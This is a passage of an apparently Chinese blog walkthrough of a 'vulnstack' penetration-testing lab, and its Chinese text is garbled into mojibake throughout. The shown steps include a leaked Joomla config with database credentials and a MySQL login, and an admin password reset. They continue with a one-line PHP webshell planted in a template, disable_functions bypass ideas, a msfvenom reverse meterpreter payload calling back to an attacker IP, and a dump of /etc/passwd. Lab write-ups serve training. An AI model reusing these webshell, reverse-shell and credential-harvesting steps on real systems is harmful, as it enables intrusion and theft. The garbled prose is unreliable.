class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs puppet">/1.php                 phpinfo()<br>/README.txt            ç¡®å®šç‰ˆæœ¬ä¸º3.x<br>/web.config.txt        ç½‘ç«™è®¿é—®é…ç½®æ–‡ä»¶<br>/configuration.php~    boomï¼å‡ºè´§äº†<br><br>Ã¨Â¯Â·Ã§Â¨ÂÃ¥â‚¬â„¢Ã¨Â®Â¿Ã©â€”Â®Ã£â‚¬â€š<span class="hljs-string">&#x27;; public <span class="hljs-variable">$display_offline_message</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offline_image</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sitename</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$editor</span> = &#x27;</span>tinymce<span class="hljs-string">&#x27;; public <span class="hljs-variable">$captcha</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$list_limit</span> = &#x27;</span>20<span class="hljs-string">&#x27;; public <span class="hljs-variable">$access</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang_const</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbtype</span> = &#x27;</span>mysqli<span class="hljs-string">&#x27;; public <span class="hljs-variable">$host</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;; public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;; public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;; public <span class="hljs-variable">$live_site</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;; public <span class="hljs-variable">$gzip</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$error_reporting</span> = &#x27;</span>default<span class="hljs-string">&#x27;; public <span class="hljs-variable">$helpurl</span> = &#x27;</span>https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;<span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_host</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_port</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_user</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_pass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_root</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_enable</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offset</span> = &#x27;</span>UTC<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailonline</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailer</span> = &#x27;</span>mail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailfrom</span> = &#x27;</span>test@test.com<span class="hljs-string">&#x27;; public <span class="hljs-variable">$fromname</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sendmail</span> = &#x27;</span>/usr/sbin/sendmail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpauth</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpuser</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtppass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtphost</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpsecure</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpport</span> = &#x27;</span>25<span class="hljs-string">&#x27;; public <span class="hljs-variable">$caching</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_handler</span> = &#x27;</span>file<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cachetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_platformprefix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaDesc</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaKeys</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaTitle</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaAuthor</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaVersion</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$robots</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_rewrite</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_suffix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$unicodeslugs</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_limit</span> = &#x27;</span>10<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_email</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$log_path</span> = &#x27;</span>/var/www/html/administrator/logs<span class="hljs-string">&#x27;; public <span class="hljs-variable">$tmp_path</span> = &#x27;</span>/var/www/html/tmp<span class="hljs-string">&#x27;; public <span class="hljs-variable">$lifetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$session_handler</span> = &#x27;</span>database<span class="hljs-string">&#x27;; public <span class="hljs-variable">$shared_session</span> = &#x27;</span>0<span class="hljs-string">&#x27;; &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">å…³é”®ä¿¡æ¯</span><br><span class="hljs-string">public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>å°è¯•åˆ©ç”¨ä¸Šè¿°è´¦å·å¯†ç ç™»å½•å¤±è´¥ï¼Œç»§ç»­å¯»æ‰¾</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>æœç´¢å¾—çŸ¥ï¼Œmsfå†…ç½®äº† <code>joomla</code> çš„æ¼æ´ï¼Œæ‰“å¼€msfconsole</p><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209123634411.png" alt="image-20231209123634411"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use auxiliary/scanner/http/joomla_version<br><span class="hljs-built_in">set</span> rhost 192.168.1.29<br><span class="hljs-built_in">set</span> threads 100<br>run<br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209124336792.png" alt="image-20231209124336792"></p><p>è·Ÿè¿™ä¸ªç‰ˆæœ¬å¯¹åº”çš„åªæ‰¾åˆ°äº†ä¸€ä¸ªæ´ï¼Œè€Œä¸”éœ€è¦ç™»é™†ååˆ©ç”¨ï¼Œåˆ°æ­¤å°è¯•å¤±è´¥</p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>æ‰“ä¸é€šå°±å›åˆ°ä¿¡æ¯æ”¶é›†ï¼Œå½“æ—¶å¼€æ”¾çš„ç«¯å£è¿˜æœ‰22å’Œ3306ï¼Œæˆ‘ä»¬åˆ†åˆ«ç”¨è¿™äº›è´¦å·å¯†ç å°è¯• <code>ssh</code> å’Œ <code>mysql</code> ç™»å½•</p><p>å°†ä¸Šè¿°ç–‘ä¼¼è´¦å·å¯†ç å†™è¿›ä¸€ä¸ªæ–‡æ¡£<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209125343847.png" alt="image-20231209125343847"></p><ol><li><p>å…ˆå°è¯•ç”¨ <code>hydra</code> çˆ†ç ´ <code>ssh</code> ç™»å½•ï¼ŒæŠ¥é”™äº†ï¼Œå†å°è¯•ç”¨sshç›´æ¥è¿æ¥ä¹ŸæŠ¥é”™ï¼Œæœç´¢å¾—çŸ¥ç‰ˆæœ¬ä¸åŒ¹é…<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209130254304.png" alt="image-20231209130254304"></p></li><li><p>åŠ å‚æ•°æ‰‹å·¥æµ‹è¯•ä¸€ä¸‹è¿™å‡ ç»„æ•°æ®ï¼Œå¯†ç é”™è¯¯ï¼Œæ’é™¤ ssh ç™»å½•</p></li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ssh <span class="hljs-attribute">-oKexAlgorithms</span>=+diffie-hellman-group1-sha1 <span class="hljs-attribute">-oHostKeyAlgorithms</span>=+ssh-dss <span class="hljs-attribute">-oCiphers</span>=+3des-cbc testuser@192.168.1.29<br></code></pre></td></tr></table></figure><ol start="3"><li>å°è¯•mysqlè¿æ¥ï¼Œ <code>testuser/cvcvgjASD!@</code> ç™»é™†æˆåŠŸ</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># terminal</span><br><span class="hljs-attribute">systemctl</span> restart mysql<br>mysql -h <span class="hljs-number">192.168.1.29</span> -utestuser -p<br></code></pre></td></tr></table></figure><ol start="4"><li><p>ç”¨å¯è§†åŒ–å·¥å…·è¿æ¥æ•°æ®åº“ï¼Œè¿™é‡Œä½¿ç”¨ <a href="https://dbeaver.io/">DBeaver Community | Free Universal Database Tool</a> å¥½å®¶ä¼™ï¼Œè¡¨å¯çœŸä¸å°‘å˜ï¼Œæ‰¾æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</p><p>åœ¨ <code>am2zu_users</code> è¡¨ä¸­å­˜æœ‰ä¸€ä¸ªæ•°æ®<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209134708055.png" alt="image-20231209134708055"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> administrator<br><span class="hljs-symbol">password:</span> $<span class="hljs-number">2</span><span class="hljs-built_in">y</span><span class="hljs-number">$10</span><span class="hljs-number">$t1RelJijihpPhL8LARC9JuM</span>/AWrVR.nto/XycrybdRbk8IEg6Dze2<br>å¯†ç ç»è¿‡åŠ å¯†ï¼Œæ— æ³•ç›´æ¥åˆ©ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œåªè¦èƒ½ç™»å½•ç®¡ç†åå°å°±èƒ½å°è¯•ä¸Šä¼ æœ¨é©¬<br></code></pre></td></tr></table></figure></li><li><p>æ‰¾åˆ°ä¸€ç¯‡ <code>joomla</code> é‡ç½®å¯†ç çš„æ–‡ç«  <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">å¦‚ä½•æ¢å¤æˆ–é‡ç½®ç®¡ç†å‘˜å¯†ç </a> ï¼ŒæŒ‰ç…§æ•™ç¨‹å°†ç®¡ç†å‘˜å¯†ç ç½®ä¸º <code>secret</code> ï¼Œå°è¯•ç™»å½•<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135422451.png" alt="image-20231209135422451"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135525738.png" alt="image-20231209135525738">!<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135721864.png" alt="image-20231209135721864"></p></li><li><p>æˆåŠŸç™»å…¥ç®¡ç†å‘˜è´¦æˆ·ï¼Œå‘ç°åå°å¯ç›´æ¥ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶ï¼Œåœ¨ä»»æ„é¡µé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥ <code>http://192.168.1.29/templates/beez3/error.php</code> å¯†ç  a<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141302248.png" alt="image-20231209141302248"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141424058.png" alt="image-20231209141424058"></p><p>è¿ä¸Šåå°è¯•æ‰§è¡Œå‘½ä»¤å¤±è´¥ï¼Œå›åˆ°ä¹‹å‰å‘ç°çš„ <code>1.php</code> ï¼Œå‘ç° <code>disable_functions</code> <img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209143217613.png" alt="image-20231209143217613"></p><p>æœç´¢å¾—çŸ¥ï¼Œè¯¥æƒ…å†µå¯ä»¥åˆ©ç”¨é»‘åå•ä¸­ä¸å­˜åœ¨çš„å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚ <code>pcntl_exec() ç»“åˆ python</code> ï¼Œä¹Ÿå¯åˆ©ç”¨ <code>LD_PRELOAD ç¯å¢ƒå˜é‡</code> ã€‚ã€‚ã€‚æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œç›´æ¥ç”¨èšå‰‘çš„ bypassæ’ä»¶(ä¸‹è½½æ—¶éœ€è¦è®¾ç½®ä»£ç†) æ¥å®ç°</p></li></ol><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>åˆ†åˆ«åœ¨ msf å’Œ cs ç”Ÿæˆåé—¨æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶æ‰§è¡Œï¼Œæ‹¿åˆ° <code>meterpreter</code> å’Œ <code>csä¸Šçº¿</code> </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.28 <span class="hljs-attribute">lport</span>=4444 -f elf &gt; shell.elf<br><br><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.28<br>run<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ åè¿è¡Œå¤±è´¥ï¼Œå°è¯•ç›´æ¥å‘½ä»¤è¡Œåå¼¹shellï¼Œä¹Ÿå¤±è´¥ï¼Œç»è¿‡ä¸€ç•ªæ£€æŸ¥ï¼Œå‘ç°ç½‘å¡ä¿¡æ¯æœ‰äº›ä¸å¯¹åŠ²<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209152756012.png" alt="image-20231209152756012"></p><p>åªæœ‰å†…ç½‘ï¼Ÿæ²¡æœ‰å¤–ç½‘ç½‘å¡ï¼Œæ‰€ä»¥åå¼¹shellåˆ†æœ¬åˆ°ä¸äº†æˆ‘çš„kaliï¼Œä½†è¿™ä¸åº”è¯¥ï¼Œæˆ‘çš„kaliæ˜æ˜å¯ä»¥è®¿é—®åˆ°å®ƒï¼Œå®ƒæ˜æ˜æœ‰å…¬ç½‘ipã€‚ã€‚ã€‚é™¤éã€‚ã€‚ã€‚æˆ‘è®¿é—®çš„ä¸æ˜¯ <code>web</code> é¶æœºã€‚ã€‚ã€‚è‰¹ï¼åšåˆ°è¿™é‡Œæˆ‘æ˜¯æœ‰ç‚¹ç„¦è™‘çš„ï¼Œå°±ç›´æ¥ç”¨ <code>web</code> é¶æœºçš„å‘½ä»¤è¡ŒæŸ¥æ‰¾ç½‘ç«™æ ¹ç›®å½•ï¼Œç»“æœæ ¹æœ¬æ²¡æœ‰â€¦å¥½å§ï¼Œçœ‹æ¥ç¡®å®ä¸æ˜¯åŒä¸€å°æœºå­ï¼Œåº”è¯¥æ˜¯åšäº†ç«¯å£è½¬å‘ä¹‹ç±»çš„ï¼Œå½“æˆ‘è®¿é—® <code>web</code> é¶æœºçš„80ç«¯å£çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨ç»™æˆ‘è½¬å‘åˆ°å¦å¤–ä¸€å°æœºå­â€¦å“”äº†ç‹—äº†</p><h5 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h5><p>æ²¡æ€è·¯æ€ä¹ˆåŠï¼Œç»§ç»­æœé›†ä¿¡æ¯ï¼Œå…ˆçœ‹çœ‹è¿™å°åˆ°æ‰‹çš„æœºå­(web1)æœ‰æ²¡æœ‰æ•æ„Ÿä¿¡æ¯</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs elixir">/etc/<span class="hljs-symbol">passwd:</span><br><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin<br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span><br>systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Bus</span> <span class="hljs-title class_">Proxy</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">108</span>::/home/<span class="hljs-symbol">syslog:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/<span class="hljs-symbol">nonexistent:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/lib/lxd/<span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span>::/var/run/<span class="hljs-symbol">dbus:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span>::/run/<span class="hljs-symbol">uuidd:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">yy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:yy</span>,,,<span class="hljs-symbol">:/home/yy</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/run/<span class="hljs-symbol">sshd:</span>/usr/sbin/nologin<br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">117</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">www:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span>::/home/<span class="hljs-symbol">www:</span>/sbin/nologin<br><br><br>/etc/mysql/mysql.conf.d/<span class="hljs-symbol">mysqld.cnf:</span><br><br>[mysqld_safe]<br>socket= /var/run/mysqld/mysqld.sock<br>nice= <span class="hljs-number">0</span><br><br>[mysqld]<br>user= mysql<br>pid-file= /var/run/mysqld/mysqld.pid<br>socket= /var/run/mysqld/mysqld.sock<br>port= <span 